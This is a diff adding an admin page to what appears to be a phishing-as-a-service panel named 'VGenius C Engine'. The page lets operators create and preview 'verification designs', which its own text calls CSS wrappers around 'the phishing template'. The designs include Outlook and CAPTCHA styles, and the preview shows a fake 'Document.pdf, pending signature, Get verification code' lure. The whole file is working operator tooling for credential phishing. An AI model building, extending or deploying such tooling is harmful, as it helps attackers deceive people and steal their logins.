@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Designs – VGenius C Engine</title>
+    <link rel="stylesheet" href="assets/css/admin.css">
+    <style>
+        .designs-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 20px;
+        }
+        .design-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            overflow: hidden;
+            transition: all 0.25s;
+        }
+        .design-card:hover {
+            border-color: rgba(0,255,102,0.2);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .design-preview {
+            height: 120px;
+            background: #f3f4f6;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .design-mini-card {
+            width: 200px;
+            padding: 16px;
+            background: #ffffff;
+            border-radius: 6px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            text-align: center;
+            font-size: 9px;
+            color: #999;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .design-mini-card .mini-line {
+            height: 3px;
+            border-radius: 2px;
+            margin-bottom: 8px;
+        }
+        .design-mini-card .mini-line.blue { background: #0078d4; }
+        .design-mini-card .mini-line.green { background: #00ff66; }
+        .design-mini-card .mini-line.purple { background: #6366f1; }
+        .design-mini-card .mini-line.gray { background: #e5e7eb; }
+        .design-card-body {
+            padding: 16px;
+        }
+        .design-card-body h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+        .design-card-body .design-meta {
+            font-size: 10px;
+            color: var(--muted);
+            font-family: 'JetBrains Mono', monospace;
+            letter-spacing: 0.06em;
+            margin-bottom: 12px;
+        }
+        .design-actions {
+            display: flex;
+            gap: 6px;
+        }
+        .css-editor {
+            width: 100%;
+            min-height: 300px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            background: #0a0a0c;
+            color: #00ff66;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            resize: vertical;
+            outline: none;
+            line-height: 1.6;
+        }
+        .html-editor {
+            width: 100%;
+            min-height: 120px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            background: #0a0a0c;
+            color: #e4e4e7;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 16px;
+            resize: vertical;
+            outline: none;
+            line-height: 1.6;
+        }
+        .live-preview-frame {
+            width: 100%;
+            height: 250px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            background: #f3f4f6;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        .preview-toggle {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 8px;
+        }
+        .preview-toggle button {
+            padding: 4px 12px;
+            border-radius: 12px;
+            border: 1px solid rgba(255,255,255,0.08);
+            background: transparent;
+            color: var(--muted);
+            cursor: pointer;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+        }
+        .preview-toggle button.active {
+            background: var(--accent);
+            color: #000;
+            border-color: var(--accent);
+        }
+    </style>
+</head>
+<body>
+    <div class="app-layout">
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-brand">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#00ff66" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                <span>VGENIUS</span>
+            </div>
+            <nav class="sidebar-nav">
+                <a href="dashboard.html" class="nav-item">Dashboard</a>
+                <a href="users.html" class="nav-item">Users</a>
+                <a href="tokens.html" class="nav-item">Tokens</a>
+                <a href="payments.html" class="nav-item">Payments</a>
+                <a href="workers.html" class="nav-item">Workers</a>
+                <a href="templates.html" class="nav-item">Templates</a>
+                <a href="designs.html" class="nav-item active">Verification Designs</a>
+                <a href="settings.html" class="nav-item">Settings</a>
+                <a href="broadcast.html" class="nav-item">Broadcast</a>
+                <a href="feedback.html" class="nav-item">Feedback</a>
+                <a href="auditlog.html" class="nav-item">Audit Log</a>
+            </nav>
+            <div class="sidebar-footer">
+                <button class="btn-logout" onclick="logout()">Logout</button>
+            </div>
+        </aside>
+        <main class="main-content">
+            <div class="header-row">
+                <div>
+                    <h1 class="page-title" style="margin:0;">Verification Designs</h1>
+                    <p style="color:var(--muted);font-size:12px;margin-top:4px;">CSS wrappers that surround the phishing template. Selectable per link during creation.</p>
+                </div>
+                <button class="btn-sm accent" style="padding:12px 20px;font-size:11px;" onclick="openCreateModal()">
+                    + Add Design
+                </button>
+            </div>
+
+            <div class="designs-grid" id="designsGrid">
+                <div class="empty-state" style="grid-column:1/-1;">Loading designs...</div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Create/Edit Modal -->
+    <div class="modal-overlay" id="designModal" style="display:none;" onclick="if(event.target===this)closeModal()">
+        <div class="modal-card modal-lg">
+            <div class="modal-header">
+                <span class="modal-title" id="modalTitle">Add Verification Design</span>
+                <button class="modal-close" onclick="closeModal()">×</button>
+            </div>
+            <form id="designForm">
+                <input type="hidden" id="designId" value="">
+                
+                <div class="form-group">
+                    <label>Design Name</label>
+                    <input type="text" id="designName" placeholder="e.g., Outlook, Minimal Clean, Dark Glass" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>CSS Content</label>
+                    <div style="font-size:10px;color:var(--muted);margin-bottom:6px;">
+                        The CSS wrapper. Must target <code>.verification-wrapper</code> and <code>.verification-card</code>. 
+                        The template content is injected into <code>#templateContent</code> inside the card.
+                    </div>
+                    <textarea class="css-editor" id="designCss" placeholder=".verification-wrapper { background: #f3f4f6; min-height: 100vh; display: flex; align-items: center; justify-content: center; }&#10;.verification-card { background: #ffffff; border-radius: 8px; padding: 40px; max-width: 440px; }"></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label>HTML Wrapper (optional)</label>
+                    <div style="font-size:10px;color:var(--muted);margin-bottom:6px;">
+                        Custom HTML structure. Use <code>&lt;div id="templateContent"&gt;&lt;/div&gt;</code> where the template should be injected.
+                        Leave empty for the default wrapper.
+                    </div>
+                    <textarea class="html-editor" id="designHtml" placeholder="<div class=&quot;verification-wrapper&quot;><div class=&quot;verification-card&quot;><div id=&quot;templateContent&quot;></div></div></div>"></textarea>
+                </div>
+
+                <div class="form-group">
+                    <label>Live Preview</label>
+                    <div class="preview-toggle">
+                        <button type="button" class="active" data-mode="desktop" onclick="updatePreview('desktop')">Desktop</button>
+                        <button type="button" data-mode="mobile" onclick="updatePreview('mobile')">Mobile</button>
+                    </div>
+                    <iframe class="live-preview-frame" id="livePreview" srcdoc=""></iframe>
+                </div>
+
+                <div style="display:flex;gap:8px;">
+                    <button type="button" class="btn-sm accent" style="flex:1;padding:14px;" onclick="saveDesign()" id="saveBtn">
+                        Create Design
+                    </button>
+                    <button type="button" class="btn-sm" style="flex:1;padding:14px;" onclick="closeModal()">
+                        Cancel
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="assets/js/admin.js"></script>
+    <script>
+        if (!localStorage.getItem('vg-admin-token')) window.location.href = 'index.html';
+        
+        let editingId = null;
+        let previewMode = 'desktop';
+
+        // --- Load Designs ---
+        async function loadDesigns() {
+            try {
+                const res = await fetch('/api/admin/designs', { headers: adminHeaders() });
+                const designs = await res.json();
+                
+                const grid = document.getElementById('designsGrid');
+                if (!designs.length) {
+                    grid.innerHTML = '<div class="empty-state" style="grid-column:1/-1;">No verification designs. Click "Add Design" to create one.</div>';
+                    return;
+                }
+                
+                grid.innerHTML = designs.map(d => {
+                    const colors = getDesignColors(d.name);
+                    return `
+                    <div class="design-card">
+                        <div class="design-preview" style="background:${colors.bg};">
+                            <div class="design-mini-card" style="border-top:3px solid ${colors.accent};">
+                                <div class="mini-line" style="background:${colors.accent};width:40px;margin:0 auto 6px;"></div>
+                                <div>●●●</div>
+                                <div style="margin-top:4px;">verification card</div>
+                            </div>
+                        </div>
+                        <div class="design-card-body">
+                            <h3>${d.name}</h3>
+                            <div class="design-meta">
+                                <span class="meta-${d.status === 'active' ? 'active' : 'disabled'}">${d.status.toUpperCase()}</span>
+                            </div>
+                            <div class="design-actions">
+                                <button class="btn-sm" onclick="openEditModal(${d.id})">Edit</button>
+                                <button class="btn-sm danger" onclick="deleteDesign(${d.id}, '${d.name}')">Delete</button>
+                            </div>
+                        </div>
+                    </div>`;
+                }).join('');
+            } catch (err) {
+                console.error('Load designs error:', err);
+                document.getElementById('designsGrid').innerHTML = '<div class="empty-state" style="grid-column:1/-1;">Failed to load designs.</div>';
+            }
+        }
+
+        function getDesignColors(name) {
+            const n = name.toLowerCase();
+            if (n.includes('outlook')) return { bg: '#f3f4f6', accent: '#0078d4' };
+            if (n.includes('minimal')) return { bg: '#fafafa', accent: '#6366f1' };
+            if (n.includes('modern') || n.includes('gradient')) return { bg: '#667eea', accent: '#ffffff' };
+            if (n.includes('slider')) return { bg: '#1a1a2e', accent: '#00ff66' };
+            if (n.includes('captcha')) return { bg: '#f5f5f5', accent: '#4285f4' };
+            return { bg: '#f0f2f5', accent: '#00ff66' };
+        }
+
+        // --- Modal Handlers ---
+        function openCreateModal() {
+            editingId = null;
+            document.getElementById('modalTitle').textContent = 'Add Verification Design';
+            document.getElementById('saveBtn').textContent = 'Create Design';
+            document.getElementById('designId').value = '';
+            document.getElementById('designName').value = '';
+            document.getElementById('designCss').value = `.verification-wrapper {\n  background: #f3f4f6;\n  min-height: 100vh;\n  display: flex;\n  align-items: center;\n  justify-content: center;\n  font-family: "Inter", sans-serif;\n}\n.verification-card {\n  background: #ffffff;\n  border-radius: 12px;\n  box-shadow: 0 4px 24px rgba(0,0,0,0.08);\n  padding: 40px;\n  max-width: 440px;\n  width: 100%;\n}`;
+            document.getElementById('designHtml').value = '<div class="verification-wrapper"><div class="verification-card"><div id="templateContent"></div></div></div>';
+            updatePreview('desktop');
+            document.getElementById('designModal').style.display = 'flex';
+        }
+
+        async function openEditModal(id) {
+            editingId = id;
+            document.getElementById('modalTitle').textContent = 'Edit Verification Design';
+            document.getElementById('saveBtn').textContent = 'Update Design';
+            document.getElementById('designId').value = id;
+            
+            try {
+                const res = await fetch(`/api/admin/designs/${id}`, { headers: adminHeaders() });
+                const d = await res.json();
+                document.getElementById('designName').value = d.name;
+                document.getElementById('designCss').value = d.css_content || '';
+                document.getElementById('designHtml').value = d.html_wrapper || '';
+                updatePreview('desktop');
+                document.getElementById('designModal').style.display = 'flex';
+            } catch (err) {
+                showToast('Failed to load design', true);
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('designModal').style.display = 'none';
+            editingId = null;
+        }
+
+        // --- Live Preview ---
+        function updatePreview(mode) {
+            previewMode = mode;
+            document.querySelectorAll('.preview-toggle button').forEach(b => {
+                b.classList.toggle('active', b.dataset.mode === mode);
+            });
+            
+            const css = document.getElementById('designCss').value;
+            const html = document.getElementById('designHtml').value || '<div class="verification-wrapper"><div class="verification-card"><div id="templateContent"></div></div></div>';
+            const finalHtml = html.replace('<div id="templateContent"></div>', 
+                '<div id="templateContent"><div style="text-align:center;padding:20px;"><div style="font-weight:600;margin-bottom:8px;">📄 Document.pdf</div><div style="color:#999;font-size:12px;">4 pages · Pending signature</div><div style="margin-top:16px;padding:10px;background:#0078d4;color:#fff;border-radius:4px;font-size:12px;">Get verification code</div></div></div>');
+            
+            const previewHtml = `<!DOCTYPE html><html><head><style>body{margin:0;}${css}${mode === 'mobile' ? '.verification-wrapper{max-width:375px;margin:0 auto;}' : ''}</style></head><body>${finalHtml}</body></html>`;
+            
+            const iframe = document.getElementById('livePreview');
+            iframe.srcdoc = previewHtml;
+            if (mode === 'mobile') {
+                iframe.style.maxWidth = '375px';
+                iframe.style.margin = '0 auto';
+                iframe.style.borderRadius = '20px';
+                iframe.style.border = '6px solid #333';
+            } else {
+                iframe.style.maxWidth = '100%';
+                iframe.style.margin = '0';
+                iframe.style.borderRadius = '0';
+                iframe.style.border = '1px solid var(--border)';
+            }
+        }
+
+        // Watch for CSS changes to update preview
+        document.addEventListener('DOMContentLoaded', () => {
+            const cssEditor = document.getElementById('designCss');
+            if (cssEditor) {
+                let timeout;
+                cssEditor.addEventListener('input', () => {
+                    clearTimeout(timeout);
+                    timeout = setTimeout(() => updatePreview(previewMode), 500);
+                });
+            }
+        });
+
+        // --- Save ---
+        async function saveDesign() {
+            const name = document.getElementById('designName').value.trim();
+            const css_content = document.getElementById('designCss').value;
+            const html_wrapper = document.getElementById('designHtml').value;
+            
+            if (!name) return showToast('Design name required', true);
+            if (!css_content) return showToast('CSS content required', true);
+            
+            const url = editingId
+                ? `/api/admin/designs/${editingId}`
+                : '/api/admin/designs';
+            const method = editingId ? 'PUT' : 'POST';
+            
+            try {
+                const res = await fetch(url, {
+                    method,
+                    headers: {
+                        ...adminHeaders(),
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ name, css_content, html_wrapper }),
+                });
+                
+                const data = await res.json();
+                if (data.id || data.success) {
+                    showToast(editingId ? 'Design updated' : 'Design created');
+                    closeModal();
+                    loadDesigns();
+                } else {
+                    showToast(data.error || 'Failed to save design', true);
+                }
+            } catch (err) {
+                showToast('Network error: ' + err.message, true);
+            }
+        }
+
+        // --- Delete ---
+        async function deleteDesign(id, name) {
+            if (!confirm(`Delete design "${name}"? Links using it will revert to the default Outlook design.`)) return;
+            try {
+                await fetch(`/api/admin/designs/${id}`, { method: 'DELETE', headers: adminHeaders() });
+                showToast('Design disabled');
+                loadDesigns();
+            } catch (err) {
+                showToast('Delete failed', true);
+            }
+        }
+
+        // --- Init ---
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+        
+        loadDesigns();
+    </script>
+</body>
+</html>
